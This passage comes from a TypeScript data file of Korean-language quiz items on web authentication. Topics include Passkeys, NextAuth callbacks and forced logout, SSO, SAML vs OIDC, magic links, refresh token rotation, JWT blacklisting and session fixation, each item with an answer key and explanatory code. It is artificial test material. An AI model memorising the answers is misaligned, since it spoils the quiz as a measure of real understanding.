      '틀린 것은 3번입니다. Passkeys의 인증 과정에서 실시간 서버 통신은 필요하지만(challenge 교환 및 서명 검증), 이는 기존 비밀번호 로그인도 마찬가지입니다. "오프라인에서 동작 안 한다"는 Passkeys만의 단점이 아닙니다. 나머지 보기는 모두 사실입니다: 피싱 면역(origin binding), 서버 유출 무의미(공개키만 저장), 비밀번호 재사용 없음(서비스별 고유 키 쌍).',
    hints: ['Passkeys도 서버 통신은 필요함 — 비밀번호와 동일'],
    deepDive:
      'Passkeys 도입 현황 및 고려사항:\n\n지원 플랫폼:\n• iOS 16+, macOS Ventura+: iCloud Keychain으로 기기 간 동기화\n• Android 9+: Google Password Manager로 동기화\n• Windows 11: Windows Hello (얼굴/지문/PIN)\n• 브라우저: Chrome 108+, Safari 16+, Firefox 122+\n\n폴백(Fallback) 전략:\n```typescript\n// Passkeys 지원 여부 확인\nconst isPasskeySupported = await PublicKeyCredential\n  .isUserVerifyingPlatformAuthenticatorAvailable()\n\nif (isPasskeySupported) {\n  // Passkey 등록/인증\n} else {\n  // 기존 비밀번호 또는 SMS OTP 폴백\n}\n```\n\n기기 분실 시 복구:\n• iCloud/Google 계정 복구로 Passkeys 복원\n• 백업 인증 수단(이메일 코드, 복구 코드) 필수 제공\n• FIDO2 Cross-Device Authentication: 다른 기기의 Passkey로 인증 가능 (QR 스캔)\n\nNestJS 구현 흐름:\n1. POST /auth/passkey/register/start → challenge 생성, Redis에 저장\n2. POST /auth/passkey/register/finish → credential 검증 후 DB에 공개키 저장\n3. POST /auth/passkey/login/start → challenge 생성\n4. POST /auth/passkey/login/finish → 서명 검증 → JWT 발급',
    relatedProblems: ['auth-q-013', 'auth-q-014'],
  },

  // ─── NextAuth JWT / Session Callback ─────────────────────────────────────────

  {
    id: 'auth-q-016',
    category: 'auth-security',
    subcategory: 'nextauth',
    type: 'multiple-choice',
    difficulty: 'easy',
    title: 'NextAuth.js — jwt vs database 세션 전략',
    description: 'NextAuth.js에서 `session: { strategy: "jwt" }`와 `session: { strategy: "database" }`의 차이로 올바른 것은?',
    options: [
      '두 전략 모두 세션 데이터를 서버 DB에 저장한다',
      '`jwt` 전략은 세션 데이터를 암호화된 Cookie에 저장하고 DB 조회 없이 검증하며, `database` 전략은 서버 DB에 세션을 저장하고 매 요청마다 DB를 조회한다',
      '`database` 전략은 JWT 토큰을 사용하고, `jwt` 전략은 DB를 사용한다',
      '`jwt` 전략은 세션이 없어 로그인 상태를 유지할 수 없다',
    ],
    correctAnswer: 1,
    explanation:
      '`jwt` 전략: 세션 데이터를 서버가 서명한 JWT로 만들어 httpOnly Cookie에 저장합니다. 서버는 DB 조회 없이 서명 검증만으로 인증합니다(Stateless). 서버리스/수평 확장에 유리합니다. `database` 전략: 세션을 DB에 저장하고 클라이언트에는 Session ID만 Cookie로 전달합니다(Stateful). 즉시 세션 무효화가 가능하지만 매 요청마다 DB를 조회합니다.',
    hints: ['jwt 전략 = Stateless, database 전략 = Stateful'],
    deepDive:
      '```typescript\n// jwt 전략 — 서버리스/Vercel 환경에 적합\nexport const authOptions: NextAuthOptions = {\n  session: { strategy: "jwt", maxAge: 30 * 24 * 60 * 60 },\n  // DB 어댑터 없이도 동작\n}\n\n// database 전략 — Prisma 어댑터 필요\nexport const authOptions: NextAuthOptions = {\n  session: { strategy: "database" },\n  adapter: PrismaAdapter(prisma),\n  // 세션 즉시 무효화 가능\n  // 모든 요청 시 DB sessions 테이블 조회\n}\n```\n\n선택 기준:\n• 서버리스(Vercel 등) → jwt\n• 즉각적인 권한 제어, 강제 로그아웃 → database\n• NextAuth 기본값: database (어댑터 없으면 jwt로 fallback)',
    relatedProblems: ['auth-q-007', 'auth-q-017'],
  },
  {
    id: 'auth-q-017',
    category: 'auth-security',
    subcategory: 'nextauth',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'NextAuth JWT callback — 최초 로그인 vs 이후 호출 분기',
    description: '다음 JWT callback 코드에서 `if (user)` 분기가 실행되는 시점은?',
    code: `jwt: async ({ token, user }) => {
  if (user) {
    return { ...token, id: user.id, role: user.role }
  }
  return token
}`,
    options: [
      '매 API 요청마다 실행된다',
      '`useSession()` 훅이 호출될 때마다 실행된다',
      '`authorize()` 함수가 user 객체를 반환한 직후 — 즉 최초 로그인 성공 시에만 실행된다',
      '`update()` 함수를 호출할 때만 실행된다',
    ],
    correctAnswer: 2,
    explanation:
      '`jwt` 콜백의 `user` 인자는 `authorize()` (CredentialsProvider) 또는 OAuth 로그인이 성공하여 user 객체가 생성된 직후, 즉 최초 로그인 시에만 전달됩니다. 이후 세션 조회/갱신 시에는 `user`가 `undefined`이므로 `if (user)` 분기가 실행되지 않고 기존 `token`이 처리됩니다. 따라서 커스텀 필드를 토큰에 저장하려면 반드시 `if (user)` 블록에서 처리해야 합니다.',
    hints: ['user 인자는 최초 로그인 1회만 존재'],
    deepDive:
      'JWT callback이 호출되는 시점:\n1. 최초 로그인 성공 → user 있음 → 커스텀 데이터 토큰에 저장\n2. useSession() 호출 → user 없음 → token 반환\n3. update() 호출 → user 없음 → token 반환 + 주기적 재검증 가능\n4. getServerSession() 호출 → user 없음\n\n```typescript\njwt: async ({ token, user, trigger, session }) => {\n  // 최초 로그인\n  if (user) {\n    return { ...token, role: (user as any).role }\n  }\n  // update() 호출 시 (trigger === "update")\n  if (trigger === "update" && session?.role) {\n    token.role = session.role\n  }\n  return token\n}\n```',
    relatedProblems: ['auth-q-016', 'auth-q-018', 'auth-q-019'],
  },
  {
    id: 'auth-q-018',
    category: 'auth-security',
    subcategory: 'nextauth',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'NextAuth session callback의 역할',
    description: '다음 코드에서 session callback이 없다면 어떤 문제가 발생하는가?',
    code: `// jwt callback에서 role을 토큰에 저장
jwt: async ({ token, user }) => {
  if (user) return { ...token, role: (user as any).role }
  return token
},

// session callback 없는 경우
// session callback이 있는 경우:
// session: async ({ session, token }) => {
//   session.user.role = token.role
//   return session
// },`,
    options: [
      'JWT 토큰이 생성되지 않는다',
      '클라이언트에서 useSession()으로 가져온 session.user.role이 undefined가 된다. JWT에는 role이 있어도 session으로 전파되지 않기 때문이다',
      'API 요청 시 401 에러가 발생한다',
      '세션이 만료된다',
    ],
    correctAnswer: 1,
    explanation:
      'jwt callback에서 token에 `role`을 저장해도, session callback이 없으면 클라이언트의 `useSession()`이 반환하는 `session.user`에는 기본 필드(name, email, image)만 포함됩니다. 커스텀 필드를 클라이언트에서 사용하려면 session callback에서 `session.user.role = token.role` 처럼 명시적으로 복사해야 합니다.',
    hints: ['token ≠ session — 별도 객체, 명시적으로 복사 필요'],
    deepDive:
      '```typescript\n// session callback: token → session 전파\nsession: async ({ session, token }) => {\n  if (session.user) {\n    session.user.role = token.role           // 필수\n    session.user.trainerId = token.id\n    session.user.forceLogout = token.forceLogout\n  }\n  if (token.error) session.error = token.error\n  return session  // 반드시 return!\n},\n\n// 타입 확장 (next-auth.d.ts)\ndeclare module "next-auth" {\n  interface Session {\n    user?: {\n      role?: string\n      forceLogout?: boolean\n    }\n    error?: "RoleChanged"\n  }\n}\n\n// 클라이언트 사용\nconst { data: session } = useSession()\nconsole.log(session?.user?.role)  // session callback 없으면 undefined\n```',
    relatedProblems: ['auth-q-017', 'auth-q-019', 'auth-q-020'],
  },
  {
    id: 'auth-q-019',
    category: 'auth-security',
    subcategory: 'nextauth',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'update() 호출이 JWT callback을 재실행하는 이유',
    description: '다음 RoleGuard 코드에서 pathname이 변경될 때마다 `update()`를 호출하는 이유는?',
    code: `export default function RoleGuard() {
  const { data: session, update } = useSession()
  const pathname = usePathname()

  useEffect(() => {
    update()
  }, [pathname])

  useEffect(() => {
    if (session?.user?.forceLogout) {
      signOut({ callbackUrl: '/login' })
    }
  }, [session?.user?.forceLogout])

  return null
}`,
    options: [
      'update()는 세션을 삭제하는 함수다',
      'update()는 /api/auth/session에 PATCH 요청을 보내 JWT callback을 재실행시키고, 재검증된 세션(forceLogout 포함)을 클라이언트에 반영한다',
      'pathname이 변경되면 자동으로 세션이 만료되므로 갱신이 필요하다',
      'update()는 서버를 재시작하는 함수다',
    ],
    correctAnswer: 1,
    explanation:
      '`update()`를 호출하면 NextAuth가 `/api/auth/session`에 요청을 보내고, 서버에서 JWT callback이 다시 실행됩니다. JWT callback 내부에서 `lastRoleCheck` 기반 5분 주기 DB 재검증이 이루어지고, 트레이너가 비활성화(useYn=\'N\')된 경우 `forceLogout=true`가 세팅됩니다. 이 변경된 세션이 클라이언트에 반영되면 두 번째 useEffect가 감지하여 `signOut()`을 트리거합니다.',
    hints: ['update() = /api/auth/session 재요청 = JWT callback 재실행'],
    deepDive:
      '흐름:\n```\npathname 변경\n→ update() 호출\n→ PATCH /api/auth/session\n→ 서버: JWT callback 실행\n→ lastRoleCheck 체크 (5분 경과?)\n→ 경과 시: DB 조회 (trainer.useYn 확인)\n→ useYn=\'N\' 발견: token.forceLogout = true 세팅\n→ session callback: session.user.forceLogout = true 전파\n→ 클라이언트: session 업데이트\n→ useEffect 감지: signOut() 호출\n→ /login 리다이렉트\n```\n\n주의: update()를 호출하지 않으면 쿠키가 갱신되지 않아 변경사항이 클라이언트에 반영되지 않습니다. JWT는 서버가 직접 push할 수 없기 때문에 클라이언트가 능동적으로 갱신을 요청해야 합니다.',
    relatedProblems: ['auth-q-017', 'auth-q-020', 'auth-q-021'],
  },
  {
    id: 'auth-q-020',
    category: 'auth-security',
    subcategory: 'nextauth',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'forceLogout 플래그 전파 흐름',
    description: '관리자가 트레이너를 삭제(useYn=\'N\')했을 때 해당 트레이너가 강제 로그아웃되는 전체 흐름에서 순서가 올바른 것은?',
    options: [
      'JWT 토큰 삭제 → DB 업데이트 → 클라이언트 리다이렉트',
      'DB에 useYn=\'N\' 저장 → 트레이너의 update() 호출 → JWT callback에서 DB 재검증 → token.forceLogout=true → session.user.forceLogout=true → signOut()',
      'signOut() 즉시 호출 → DB 업데이트',
      'Middleware가 DB를 직접 폴링하여 useYn=\'N\'을 감지 → 요청 차단',
    ],
    correctAnswer: 1,
    explanation:
      '강제 로그아웃은 직접 토큰을 삭제할 수 없는 JWT 전략의 한계를 우회합니다. ① DB에 useYn=\'N\' 저장(소프트 삭제), ② 트레이너가 페이지 이동 시 RoleGuard의 update() 호출, ③ JWT callback 재실행 → lastRoleCheck 경과 시 DB 조회, ④ useYn=\'N\' 확인 → token.forceLogout=true, error=\'RoleChanged\' 세팅, ⑤ session callback → session.user.forceLogout=true 전파, ⑥ RoleGuard가 감지 → signOut() 호출. Middleware는 이미 forceLogout=true인 토큰의 접근을 차단하는 역할을 합니다.',
    hints: ['JWT 전략에서는 토큰을 직접 삭제할 수 없어 플래그 방식 사용'],
    deepDive:
      '최악의 시나리오: 트레이너가 삭제 후 5분 이내에 페이지 이동을 하지 않으면 최대 5분간 접근 가능합니다(ROLE_CHECK_INTERVAL_SECONDS = 300). 이는 성능(매 요청마다 DB 조회 방지)과 보안의 트레이드오프입니다.\n\n더 빠른 강제 로그아웃이 필요한 경우:\n• database 전략 사용 → 세션 레코드 직접 삭제로 즉시 무효화\n• JWT Blacklist (Redis) → 삭제 즉시 토큰을 블랙리스트에 등록\n• ROLE_CHECK_INTERVAL_SECONDS를 줄임 (DB 부하 증가)',
    relatedProblems: ['auth-q-019', 'auth-q-021'],
  },
  {
    id: 'auth-q-021',
    category: 'auth-security',
    subcategory: 'nextauth',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'withAuth middleware — authorized 콜백',
    description: '다음 middleware 코드에서 `authorized` 콜백이 `false`를 반환하면 어떻게 되는가?',
    code: `export default withAuth(
  (req) => {
    const requestHeaders = new Headers(req.headers)
    requestHeaders.set('x-current-pathname', req.nextUrl.pathname)
    return NextResponse.next({ request: { headers: requestHeaders } })
  },
  {
    callbacks: {
      authorized: ({ token }) => {
        if (token?.forceLogout) return false
        return !!token
      },
    },
  }
)`,
    options: [
      '요청이 정상 처리되고 middleware 함수가 실행된다',
      '`false`를 반환하면 middleware 함수 실행이 건너뛰어지고, `signIn` 페이지로 리다이렉트된다',
      '500 서버 에러가 발생한다',
      '요청이 즉시 취소되고 브라우저가 닫힌다',
    ],
    correctAnswer: 1,
    explanation:
      '`authorized` 콜백이 `false`를 반환하면 NextAuth는 사용자를 자동으로 로그인 페이지(기본값: `/api/auth/signin`)로 리다이렉트합니다. middleware 함수(첫 번째 인자)는 실행되지 않습니다. 이 코드에서는 유효한 토큰이 있더라도 `forceLogout=true`이면 `false`를 반환하므로, 강제 로그아웃된 트레이너는 어떤 페이지에도 접근할 수 없습니다.',
    hints: ['authorized = false → signIn 페이지로 리다이렉트'],
    deepDive:
      '```typescript\nexport default withAuth(middlewareFn, {\n  callbacks: {\n    authorized: ({ token }) => {\n      // false 반환 → 로그인 페이지 리다이렉트\n      // true 반환 → middlewareFn 실행\n      return !!token && !token.forceLogout\n    },\n  },\n  pages: {\n    signIn: "/login",  // 커스텀 로그인 페이지\n  },\n})\n\n// config: matcher로 보호할 경로 설정\nexport const config = {\n  matcher: [\n    "/((?!register|api|login|key|privacy|terms|robots).*)"\n  ],\n}\n```\n\n`matcher` 패턴에서 `(?!...)` 는 부정 전방탐색으로, 해당 경로는 middleware를 건너뜁니다. 로그인 페이지(/login), API 라우트(/api), 공개 페이지를 제외하고 모든 페이지를 보호합니다.',
    relatedProblems: ['auth-q-019', 'auth-q-020'],
  },
  {
    id: 'auth-q-022',
    category: 'auth-security',
    subcategory: 'nextauth',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'next-auth.d.ts — TypeScript 모듈 확장',
    description: '다음 코드가 필요한 이유로 올바른 것은?',
    code: `// next-auth.d.ts
declare module 'next-auth' {
  interface Session {
    user?: {
      role?: string
      forceLogout?: boolean
    }
    error?: 'RoleChanged'
  }
}

declare module 'next-auth/jwt' {
  interface JWT {
    role?: string
    forceLogout?: boolean
    lastRoleCheck?: number
  }
}`,
    options: [
      'NextAuth.js 런타임 동작을 변경하기 위해 필요하다',
      'NextAuth의 기본 User/Session/JWT 타입에는 role, forceLogout 같은 커스텀 필드가 없으므로, TypeScript에게 이 필드들이 존재함을 알려 타입 오류 없이 사용할 수 있게 한다',
      '이 파일이 없으면 NextAuth가 작동하지 않는다',
      '이 파일은 JWT 서명 알고리즘을 설정한다',
    ],
    correctAnswer: 1,
    explanation:
      'TypeScript의 Declaration Merging(선언 병합) 기능을 활용합니다. `declare module \'next-auth\'`로 기존 모듈의 타입을 확장하여, `session.user?.role`, `session.user?.forceLogout`, `token.lastRoleCheck` 같은 커스텀 필드에 TypeScript 타입 오류 없이 접근할 수 있게 됩니다. 런타임 동작과는 무관하며, 순수하게 타입 시스템에만 영향을 줍니다.',
    hints: ['Declaration Merging = 기존 타입을 확장하는 TypeScript 기능'],
    deepDive:
      '```typescript\n// next-auth.d.ts — 전체 예시\nimport { DefaultUser } from "next-auth"\n\ndeclare module "next-auth" {\n  interface User extends DefaultUser {\n    role?: "admin" | "trainer" | "user"\n    trainerId?: string\n    forceLogout?: boolean\n  }\n  interface Session {\n    user?: User  // 위에서 확장한 User 참조\n    error?: "RoleChanged"\n  }\n}\n\ndeclare module "next-auth/jwt" {\n  interface JWT {\n    id?: string\n    role?: "admin" | "trainer" | "user"\n    forceLogout?: boolean\n    lastRoleCheck?: number\n    error?: "RoleChanged"\n  }\n}\n\n// 이 파일은 tsconfig.json의 include에 포함되어야 합니다\n// tsconfig.json: { "include": ["next-auth.d.ts", "src/**/*"] }\n```',
    relatedProblems: ['auth-q-017', 'auth-q-018'],
  },

  // ─── 로그인 기법 비교 ──────────────────────────────────────────────────────────

  {
    id: 'auth-q-023',
    category: 'auth-security',
    subcategory: 'sso',
    type: 'multiple-choice',
    difficulty: 'easy',
    title: 'SSO(Single Sign-On) 핵심 개념',
    description: 'SSO(Single Sign-On)의 정의와 대표적인 사용 사례로 올바른 것은?',
    options: [
      'SSO는 여러 비밀번호를 하나의 마스터 비밀번호로 관리하는 비밀번호 매니저다',
      'SSO는 한 번의 로그인으로 여러 독립적인 서비스에 재인증 없이 접근할 수 있는 인증 방식이다. 기업 환경에서 사내 시스템들(HR, 그룹웨어, ERP)을 단일 인증으로 통합할 때 주로 사용된다',
      'SSO는 동일한 비밀번호를 여러 사이트에 재사용하는 관행을 의미한다',
      'SSO는 소셜 로그인(Google, Kakao)과 동일한 기술이다',
    ],
    correctAnswer: 1,
    explanation:
      'SSO는 중앙 IdP(Identity Provider)에서 한 번 인증하면, SP(Service Provider)들이 IdP에게 "이 사람이 인증됐나요?"를 확인하여 별도 로그인 없이 접근을 허용하는 방식입니다. 기업에서 구글 워크스페이스/Okta로 사원이 한 번 로그인하면 Slack, Jira, GitHub, 그룹웨어 등 모든 사내 시스템에 자동 로그인되는 것이 대표적인 예입니다.',
    hints: ['SSO = 한 번 로그인, 여러 서비스 이용'],
    deepDive:
      'SSO 구성 요소:\n• IdP (Identity Provider): 중앙 인증 서버 — Okta, Azure AD, Google Workspace\n• SP (Service Provider): 개별 서비스 — Slack, GitHub, 사내 시스템\n\nSSO 프로토콜:\n• SAML 2.0: XML 기반, 기업 환경, 레거시 시스템과 호환성 좋음\n• OIDC: JSON/JWT 기반, 모던 웹/모바일 앱, 구현 쉬움\n\nSSO 장점:\n• 사용자: 비밀번호 1개만 기억\n• 보안 팀: 퇴직 직원 계정을 IdP에서 한 번만 비활성화하면 모든 서비스 접근 차단\n• 개발팀: 개별 인증 구현 불필요',
    relatedProblems: ['auth-q-024', 'auth-q-006'],
  },
  {
    id: 'auth-q-024',
    category: 'auth-security',
    subcategory: 'sso',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'SAML vs OIDC 비교',
    description: 'SAML 2.0과 OIDC(OpenID Connect)를 비교한 것으로 올바른 것은?',
    options: [
      'SAML은 모바일 앱에 최적화되어 있고, OIDC는 레거시 엔터프라이즈 시스템에 적합하다',
      'SAML은 XML 기반으로 기업 레거시 시스템과 호환성이 높고, OIDC는 JWT/JSON 기반으로 모던 웹/모바일에 적합하며 구현이 더 간단하다',
      'SAML과 OIDC는 완전히 동일한 기술이며 이름만 다르다',
      'OIDC는 SSO를 지원하지 않는다',
    ],
    correctAnswer: 1,
    explanation:
      'SAML 2.0: 2005년 표준, XML + SOAP 기반, 기업의 Active Directory, 레거시 ERP/HR 시스템과 통합 시 주로 사용. XML 파싱 복잡. OIDC: 2014년 표준, JWT + REST 기반, 구글/카카오/GitHub 소셜 로그인, Okta 등 현대적 IdP에 사용. 라이브러리 지원 풍부, SPA/모바일에 적합. 새로 구축하는 시스템은 대부분 OIDC를 선택합니다.',
    hints: ['SAML = XML 구세대, OIDC = JWT 신세대'],
    deepDive:
      '비교표:\n\n| 항목 | SAML 2.0 | OIDC |\n|---|---|---||\n| 연도 | 2005 | 2014 |\n| 데이터 형식 | XML | JSON/JWT |\n| 전송 방식 | HTTP Redirect/POST | HTTP Redirect + REST |\n| 모바일 | 어려움 | 쉬움 |\n| 구현 복잡도 | 높음 | 낮음 |\n| 주요 사용처 | 기업 레거시 | 모던 웹/모바일 |\n\nNextAuth.js는 OIDC를 네이티브 지원:\n```typescript\n// Okta OIDC — SSO\nOktaProvider({\n  clientId: process.env.OKTA_CLIENT_ID,\n  issuer: "https://company.okta.com",\n})\n\n// SAML은 별도 라이브러리 필요\nimport { Strategy as SamlStrategy } from "passport-saml"\n```',
    relatedProblems: ['auth-q-023', 'auth-q-006'],
  },
  {
    id: 'auth-q-025',
    category: 'auth-security',
    subcategory: 'auth-methods',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Magic Link vs Email OTP — 차이와 보안',
    description: 'Magic Link와 Email OTP의 차이 및 보안 특성으로 올바른 것은?',
    options: [
      'Magic Link는 비밀번호가 링크에 포함되어 있어 안전하지 않다',
      'Magic Link는 클릭 한 번으로 로그인되는 일회용 URL이고, Email OTP는 짧은 숫자 코드를 입력하는 방식이다. 둘 다 이메일 계정 보안에 의존하며 짧은 유효시간(5~15분)이 핵심 보안 요소다',
      'Magic Link는 재사용 가능하고 유효기간이 없다',
      'Email OTP는 SMS OTP보다 SIM 스와핑 공격에 취약하다',
    ],
    correctAnswer: 1,
    explanation:
      'Magic Link: 서버가 단기 토큰을 생성하여 URL에 포함(`/auth/verify?token=xxxxx`)하고, 사용자가 클릭하면 토큰 검증 후 세션 발급. Email OTP: 6자리 랜덤 숫자를 이메일로 전송, 사용자가 입력. 둘 다 ① 토큰/코드 1회용 ② 짧은 유효시간 ③ 사용 즉시 서버에서 삭제 세 가지가 보안 핵심입니다. SMS OTP와 달리 SIM 스와핑 공격 영향 없음.',
    hints: ['이메일 계정 = 인증의 신뢰 근거'],
    deepDive:
      '```typescript\n// Magic Link 구현 (NestJS)\nasync sendMagicLink(email: string) {\n  const token = crypto.randomBytes(32).toString("hex")\n  await redis.set(\`magic:\${token}\`, email, "EX", 15 * 60) // 15분\n  const link = \`https://myapp.com/auth/verify?token=\${token}\`\n  await emailService.send({ to: email, subject: "로그인 링크", html: link })\n}\n\nasync verifyMagicLink(token: string) {\n  const email = await redis.get(\`magic:\${token}\`)\n  if (!email) throw new UnauthorizedException("만료된 링크")\n  await redis.del(\`magic:\${token}\`) // 1회용\n  const user = await userRepo.findByEmail(email)\n  return jwtService.sign({ sub: user.id })\n}\n\n// NextAuth EmailProvider가 이 로직을 내장\n```\n\nSecurity tips:\n• 토큰은 crypto.randomBytes(32) 이상 — 예측 불가\n• 사용 후 즉시 Redis에서 삭제\n• 유효시간 10~15분 이내\n• 동일 이메일로 재요청 시 이전 토큰 무효화 권장',
    relatedProblems: ['auth-q-007', 'auth-q-026'],
  },
  {
    id: 'auth-q-026',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'Refresh Token Rotation 심화',
    description: 'Refresh Token Rotation 패턴에서 탈취된 Refresh Token을 감지하는 원리로 올바른 것은?',
    options: [
      'Refresh Token에 IP 주소가 저장되어 IP가 바뀌면 감지된다',
      '갱신 시 이전 Refresh Token을 무효화하고 새 Refresh Token을 발급한다. 공격자가 탈취한 토큰으로 갱신을 시도하면 이미 사용된 토큰이므로 감지되고, 해당 사용자의 모든 세션을 강제 종료할 수 있다',
      'Refresh Token은 탈취되어도 Access Token이 없으면 아무것도 할 수 없다',
      'Rotation은 성능 최적화를 위한 기법으로 보안과 무관하다',
    ],
    correctAnswer: 1,
    explanation:
      'Refresh Token Rotation: ① 갱신 요청 → 서버가 기존 RT 무효화 + 새 RT 발급. ② 정상 사용자는 항상 새 RT를 가짐. ③ 공격자가 탈취한 이전 RT로 갱신 시도 → 서버가 "이미 사용된 RT"를 감지 → 해당 사용자의 모든 RT를 무효화(세션 강제 종료). 이를 Refresh Token Reuse Detection이라고 합니다. 단, 동시 요청 발생 시 정상 사용자도 로그아웃될 수 있으므로 구현에 주의 필요.',
    hints: ['이미 사용된 RT로 갱신 요청 = 탈취 의심'],
    deepDive:
      '```typescript\n// Refresh Token Rotation (NestJS)\nasync refreshTokens(userId: string, oldRefreshToken: string) {\n  const user = await userRepo.findById(userId)\n\n  // ① 이전 RT와 DB 저장 RT 비교\n  const isValid = await bcrypt.compare(oldRefreshToken, user.hashedRefreshToken)\n  if (!isValid) {\n    // 이미 사용된 RT → 탈취 의심 → 모든 세션 무효화\n    await userRepo.clearAllRefreshTokens(userId)\n    throw new ForbiddenException("Token reuse detected")\n  }\n\n  // ② 새 토큰 발급\n  const newAccessToken = jwtService.sign({ sub: userId }, { expiresIn: "15m" })\n  const newRefreshToken = uuidv4()\n\n  // ③ 새 RT 저장 (해시 저장), 이전 RT 무효화\n  await userRepo.updateRefreshToken(userId, await bcrypt.hash(newRefreshToken, 10))\n\n  return { accessToken: newAccessToken, refreshToken: newRefreshToken }\n}\n```\n\nRT 저장 방법:\n• DB에 해시 저장 (bcrypt) — DB 유출 시 원본 RT 보호\n• httpOnly Cookie — XSS 방어\n• Rotate 시 기존 RT 즉시 무효화',
    relatedProblems: ['auth-q-002', 'auth-q-004'],
  },
  {
    id: 'auth-q-027',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'JWT Blacklist — 강제 로그아웃 구현',
    description: 'JWT(Stateless) 방식에서 즉각적인 강제 로그아웃을 구현하는 Blacklist 패턴으로 올바른 것은?',
    options: [
      'JWT는 Stateless이므로 강제 로그아웃 구현이 원천적으로 불가능하다',
      '로그아웃 시 해당 JWT를 Redis Blacklist에 저장하고, 모든 API 요청에서 Blacklist 조회 후 포함된 토큰은 거부한다. TTL을 토큰 만료 시간과 동일하게 설정하여 자동 정리한다',
      'Blacklist에 토큰을 저장하면 보안이 약해진다',
      'JWT를 DB에 전부 저장하는 방식으로만 강제 로그아웃이 가능하다',
    ],
    correctAnswer: 1,
    explanation:
      'JWT Blacklist 패턴: ① 로그아웃/강제 로그아웃 시 해당 JWT를 Redis에 저장(`SET blacklist:{token} 1 EX {남은TTL}`). ② Guard/Middleware에서 매 요청마다 Redis Blacklist 조회. ③ 블랙리스트에 있으면 401 반환. 단점: 매 요청마다 Redis 조회(DB보다 빠르지만 비용 발생), Blacklist가 커지면 메모리 사용 증가. TTL을 토큰 만료 시간과 동일하게 설정하면 만료된 토큰이 자동으로 Redis에서 제거됩니다.',
    hints: ['Redis TTL = 토큰 남은 만료 시간으로 설정 → 자동 정리'],
    deepDive:
      '```typescript\n// NestJS JwtAuthGuard with Blacklist\n@Injectable()\nexport class JwtAuthGuard extends AuthGuard("jwt") {\n  constructor(private readonly redis: RedisService) { super() }\n\n  async canActivate(context: ExecutionContext): Promise<boolean> {\n    // 1. JWT 서명 검증\n    const isValid = await super.canActivate(context) as boolean\n    if (!isValid) return false\n\n    // 2. Blacklist 조회\n    const request = context.switchToHttp().getRequest()\n    const token = request.headers.authorization?.replace("Bearer ", "")\n    const isBlacklisted = await this.redis.get(\`blacklist:\${token}\`)\n    if (isBlacklisted) throw new UnauthorizedException("로그아웃된 토큰")\n\n    return true\n  }\n}\n\n// 로그아웃 시 Blacklist 등록\nasync logout(token: string) {\n  const decoded = jwtService.decode(token) as { exp: number }\n  const ttl = decoded.exp - Math.floor(Date.now() / 1000)\n  if (ttl > 0) {\n    await redis.set(\`blacklist:\${token}\`, "1", "EX", ttl)\n  }\n}\n```',
    relatedProblems: ['auth-q-007', 'auth-q-020', 'auth-q-026'],
  },
  {
    id: 'auth-q-028',
    category: 'auth-security',
    subcategory: 'auth-methods',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: '로그인 기법 선택 기준',
    description: '다음 시나리오별로 가장 적합한 인증 방식을 매칭한 것으로 올바른 것은?',
    options: [
      'A) B2C 서비스 소셜 로그인 → SAML, B) 기업 내부 시스템 통합 → Magic Link, C) 금융 서비스 → 비밀번호만',
      'A) B2C 서비스 소셜 로그인 → OAuth/OIDC (Google, Kakao), B) 기업 내부 시스템 통합 → SSO (Okta/SAML/OIDC), C) 금융 서비스 → 비밀번호 + TOTP MFA 또는 Passkeys',
      'A) B2C 서비스 → JWT만, B) 기업 내부 → JWT만, C) 금융 → JWT만',
      '어떤 서비스든 Session 기반이 가장 안전하다',
    ],
    correctAnswer: 1,
    explanation:
      'B2C 소셜 로그인: OAuth 2.0/OIDC를 사용하는 Google, Kakao 등의 provider를 연동합니다(NextAuth.js 활용). 기업 내부 시스템: SSO로 직원이 한 번만 로그인하면 모든 사내 서비스 접근, 퇴직자 계정 일괄 관리. 금융/의료 등 보안 최우선 서비스: MFA(TOTP 앱)나 Passkeys로 추가 인증 레이어를 요구합니다. 하나의 정답이 아니라 서비스 특성에 따라 조합해서 사용합니다.',
    hints: ['서비스 유형에 따라 최적 기법이 다름'],
    deepDive:
      '실무 선택 가이드:\n\n| 상황 | 추천 방식 |\n|---|---|\n| 빠른 MVP, 소규모 앱 | NextAuth.js + Credentials + JWT |\n| B2C 소셜 로그인 | NextAuth.js + OAuth (Google/Kakao/GitHub) |\n| B2B SaaS | OIDC 기반 SSO (Okta, Auth0) |\n| 기업 레거시 통합 | SAML 2.0 |\n| 비밀번호 없는 서비스 | Magic Link + Email OTP |\n| 금융/의료 | 비밀번호 + TOTP MFA + Passkeys |\n| MSA/수평 확장 | JWT + Redis Blacklist + Refresh Rotation |\n| 즉각 권한 제어 필요 | Session + Redis |\n\n팁: 인증은 직접 구현보다 Auth0, Clerk, Supabase Auth 같은 인증 플랫폼 활용을 검토하세요.',
    relatedProblems: ['auth-q-007', 'auth-q-023', 'auth-q-030'],
  },
  {
    id: 'auth-q-029',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'Session Fixation 공격',
    description: 'Session Fixation 공격과 방어 방법으로 올바른 것은?',
    options: [
      'Session Fixation은 세션이 너무 오래 유지될 때 발생하는 성능 문제다',
      '공격자가 미리 알고 있는 Session ID를 피해자에게 사용하도록 유도한 뒤, 피해자 로그인 후 그 Session ID로 세션을 탈취하는 공격이다. 로그인 성공 시 반드시 새 Session ID를 발급하여 방어한다',
      'Session Fixation은 XSS와 동일한 공격이다',
      'Session Fixation은 JWT 방식에서만 발생한다',
    ],
    correctAnswer: 1,
    explanation:
      'Session Fixation: ① 공격자가 임의 Session ID 획득 → ② 피해자에게 그 Session ID를 강제 설정(URL 파라미터, JS 등으로) → ③ 피해자가 해당 Session ID로 로그인 → ④ 공격자가 동일 Session ID로 피해자 계정 접근. 방어: **로그인 성공 직후 반드시 새 Session ID를 재발급**합니다(`req.session.regenerate()`). Express-session은 기본적으로 이를 처리하지만 명시적으로 확인 필요.',
